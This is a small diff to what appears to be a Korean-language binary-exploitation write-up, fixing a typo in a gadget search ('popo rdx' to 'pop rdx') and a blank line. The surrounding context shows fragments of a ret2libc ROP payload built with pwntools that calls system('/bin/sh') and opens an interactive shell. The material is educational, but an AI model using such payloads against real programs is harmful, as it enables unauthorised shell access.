@@ -116,7 +116,7 @@ system(binsh)
 - pop rsi; ret : 0x00400841
 - rdx는 찾지 못하였다. 이런 경우 libc 파일에서 gadgets을 찾아 활용할 수 있다.
 
-> find "popo rdx"
+> find "pop rdx"
 >
 > > rp++
 
@@ -165,7 +165,7 @@ payload += p64(libcbase + binsh_offset)
 payload += p64(libcbase + libcbase_system_offset)
  
 r.send(payload)
- 
+
 r.interactive()
 ```
 
